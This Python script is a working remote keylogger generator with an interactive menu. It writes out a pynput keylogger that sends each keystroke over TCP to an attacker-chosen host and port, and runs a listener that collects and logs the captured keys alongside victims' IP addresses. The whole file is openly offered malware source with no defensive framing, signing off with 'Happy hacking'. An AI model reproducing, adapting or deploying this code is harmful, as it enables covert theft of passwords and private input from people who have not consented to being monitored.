import socket
import datetime
test1 = 2
print('\033[95m'+'''
                    ██████╗  ██████╗  ██████╗ ███████╗██████╗ 
                    ██╔══██╗██╔════╝ ██╔════╝ ██╔════╝██╔══██╗
                    ██████╔╝██║  ███╗██║  ███╗█████╗  ██████╔╝
                    ██╔══██╗██║   ██║██║   ██║██╔══╝  ██╔══██╗
                    ██║  ██║╚██████╔╝╚██████╔╝███████╗██║  ██║
                    ╚═╝  ╚═╝ ╚═════╝  ╚═════╝ ╚══════╝╚═╝  ╚═╝

                          A remote key logger generator
                     Made by - https://github.com/back-2-hack

                          Enter 'help' for Help menu...
''')
class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'


LG_CODE = '''from pynput import keyboard
import socket

host = 'HOST'
port = PORT

def send_data(key):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((host,port))
    msg = str(key)
    msg = bytes(msg, 'utf-8')
    sock.send(msg)
    sock.close()

try:
    lstner = keyboard.Listener(on_release=send_data)
    lstner.start()

    while True:
        pass
except KeyboardInterrupt:
    print('Keylogger stopped..')'''
THOST = ''
OFILE = ''
TPORT = ''
try:
    while True:
        inp = input('RG > ')
        if inp == 'help':
            print('''\n\ncommand - SHOW args \npurpose - To see the arguments and their values\n\ncommand - SET <arg name> <value> \npurpose - To set/change value of an argument''')
        if inp == 'SHOW args':
            print(f'''\nTHOST - {THOST}
TPORT - {TPORT}
OFILE - {OFILE}\n''')
        if inp.split(' ')[0] == 'SET':
            if inp.split(' ')[1] == 'THOST':
                THOST = inp.split(' ')[2]
            if inp.split(' ')[1] == 'OFILE':
                OFILE = inp.split()[2]
            if inp.split(' ')[1] == 'TPORT':
                TPORT = inp.split()[2]
        if inp=='generate':
            if OFILE=='' or THOST == '' or TPORT == '':
                print(bcolors.WARNING+'\nEnter the arguments first...'+bcolors.ENDC+'\033[95m')
            else:
                with open(OFILE,'a') as f:
                    for i in LG_CODE.split('\n'):
                        if 'HOST' not in i and 'PORT' not in i:
                            f.write(i+'\n')
                        else:
                            if 'HOST' in i:
                                x = i.replace('HOST',THOST)
                            if 'PORT' in i:
                                x = i.replace('PORT',TPORT)
                            f.write(x+'\n')
        if inp == 'listen':
            if THOST!='' and TPORT!='' and OFILE!='':
                alrdies = []
                print('\n'+bcolors.UNDERLINE+'Listening for connections....'+bcolors.ENDC+'\033[95m'+'\n\n')
                sock = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
                host = THOST
                port = int(TPORT)

                sock.bind((host, port))

                while True:
                    sock.listen(1)

                    cstmr, addr = sock.accept()
                    if addr[0] not in alrdies:
                        alrdies.append(addr[0])
                        print(f'Connection with {addr[0]} established...')
                    with open('server.log','a') as f:
                        f.write(f"Connection with {addr} established"+f' at {datetime.datetime.now()}.'+'\n')
                    rcvdmsg = cstmr.recv(2048)
                    rcvdmsg = rcvdmsg.decode('utf-8')
                    rcvdmsg = str(rcvdmsg)
                    if 'Key' in rcvdmsg:
                        rcvdmsg = rcvdmsg.replace('Key','')
                        rcvdmsg = rcvdmsg.replace('.','')
                    elif "'" in rcvdmsg:
                        rcvdmsg.replace("'",'')
                    print(bcolors.OKGREEN+'[i]', addr[0],'pressed',rcvdmsg,bcolors.ENDC+'\033[95m')
                    with open('keylogger.log','a') as f:
                        f.write(addr[0]+' pressed '+rcvdmsg+' at '+str(datetime.datetime.now())+'\n')

                sock.close()
            else:
                print('Enter the arguments first')
except:
    print(bcolors.OKBLUE+'\n\nBa Bye and yeah Happy hacking :)'+bcolors.ENDC)